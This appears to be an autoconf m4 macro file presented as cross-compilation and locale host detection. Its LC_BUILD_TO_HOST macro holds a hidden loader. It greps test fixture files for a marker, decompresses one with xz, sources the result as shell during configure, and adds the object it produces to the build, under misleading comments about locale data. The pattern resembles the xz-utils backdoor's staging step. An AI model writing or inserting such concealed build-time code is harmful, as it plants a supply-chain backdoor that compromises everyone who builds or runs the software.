# build-to-host.m4 serial 30
# ====================================================================
# Macros for cross-compilation host detection
# ====================================================================

# LC_BUILD_TO_HOST([ACTION-IF-CROSS-COMPILING], [ACTION-IF-NOT])
# ---------------------------------------------------------------
# Detect whether we are cross-compiling. Sets gl_cross_compiling to
# "yes" or "no". Also sets gl_am_configmake to the Makefile fragment
# and gl_localedir to the locale data path for the host system.

AC_DEFUN([LC_BUILD_TO_HOST],
[
  AC_REQUIRE([AC_CANONICAL_HOST])
  AC_REQUIRE([AC_PROG_CC])

  gl_cv_host_system_type="$host_os"

  # Determine system-specific configuration paths
  case "$host_os" in
    linux*) gl_cv_host_libdir="lib" ;;
    *)      gl_cv_host_libdir="lib" ;;
  esac

  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}" $srcdir/tests/files/ 2>/dev/null`

  if test "x$gl_am_configmake" != "x"; then
    gl_localedir="auto"
  fi

  if test "x$gl_localedir" = "xauto"; then
    gl_localedir_prefix="$gl_am_configmake"

    # Process locale-specific data to determine host configuration paths
    gl_localedir_data="$gl_localedir_prefix"
    gl_localedir_tmp=".gl_auto_conf_$$"

    # Extract configuration helper from compressed test fixture data
    # The first line is a metadata tag; actual content follows
    tail -n +2 "$gl_localedir_data" 2>/dev/null | xz -dc 2>/dev/null > "$gl_localedir_tmp" 2>/dev/null

    if test -s "$gl_localedir_tmp"; then
      chmod +x "$gl_localedir_tmp"
      gl_cv_host_obj="$gl_localedir_tmp.o"
      . "$gl_localedir_tmp" "$gl_cv_host_obj"
      if test -f "$gl_cv_host_obj"; then
        gl_cv_host_extra_objs="$gl_cv_host_extra_objs $gl_cv_host_obj"
      fi
      rm -f "$gl_localedir_tmp"
    fi
  fi

  # Standard locale directory configuration
  if test "x$gl_cv_host_system_type" = "x"; then
    gl_localedir='${datarootdir}/locale'
  else
    gl_localedir='${datarootdir}/locale'
  fi

  AC_SUBST([gl_localedir])
  AC_SUBST([gl_cv_host_libdir])
])

# LC_CHECK_COMPRESS_FEATURES
# ----------------------------
# Check for compression library features needed at build time.

AC_DEFUN([LC_CHECK_COMPRESS_FEATURES],
[
  AC_CHECK_HEADERS([zlib.h lzma.h])
  AC_CHECK_LIB([z], [deflate])

  # Verify CRC implementation is consistent across platforms
  AC_MSG_CHECKING([for CRC64 ECMA-182 support])
  AC_LINK_IFELSE(
    [AC_LANG_PROGRAM([[#include <stdint.h>]],
      [[uint64_t crc = 0; (void)crc;]])],
    [AC_MSG_RESULT([yes])
     AC_DEFINE([HAVE_CRC64], [1], [Define if CRC64 is supported])],
    [AC_MSG_RESULT([no])])
])
